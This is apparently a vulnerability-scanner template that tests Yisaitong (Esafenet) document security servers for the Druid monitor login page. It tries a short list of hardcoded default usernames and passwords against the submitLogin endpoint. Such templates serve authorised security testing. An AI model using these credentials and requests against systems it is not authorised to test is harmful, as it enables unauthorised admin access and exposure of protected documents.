id: poc-yaml-yisaitong-esafenet-weak-password
info:
  name: Yisaitong Electronic Document Security System Weak Password
  author: ProjectDiscoveryAI
  severity: medium
  tags: weak-password

variables:
  username:
    - druid
    - DocAdmin
    - LogAdmin
  password:
    - EstNet.Druid
    - Est@Spc820

http:
  - raw:
      - |
        GET /CDGServer3/druid/login.html HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "druid monitor"

  - raw:
      - |
        POST /CDGServer3/druid/submitLogin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        loginUsername={{username}}&loginPassword={{password}}
    payloads:
      username:
        - druid
        - DocAdmin
        - LogAdmin
      password:
        - EstNet.Druid
        - Est@Spc820
    attack: pitchfork
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "success"
